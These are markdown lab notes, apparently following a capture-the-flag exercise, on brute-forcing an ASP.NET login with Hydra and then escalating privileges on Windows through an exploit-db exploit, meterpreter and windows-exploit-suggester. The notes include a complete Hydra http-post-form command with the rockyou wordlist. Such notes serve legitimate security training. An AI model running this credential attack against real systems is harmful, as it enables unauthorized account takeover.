# Using Hydra to brute-force a login
Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux
machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain 
the password.

```sh
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

E.g. in our case:
```sh
hydra -v -l admin -P /usr/share/wordlists/rockyou.txt 10.10.76.78 http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).
However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Below is a mini cheatsheet:
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/f462de90-f397-47e6-a840-54cf890fa28a)

# Compromise the machine
In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com/)) to get initial access on this Windows machine!
Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration 
testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

# Windows Privilege Escalation
First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered 
information to exploit the system and become the Administrator.


You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the 
[windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.
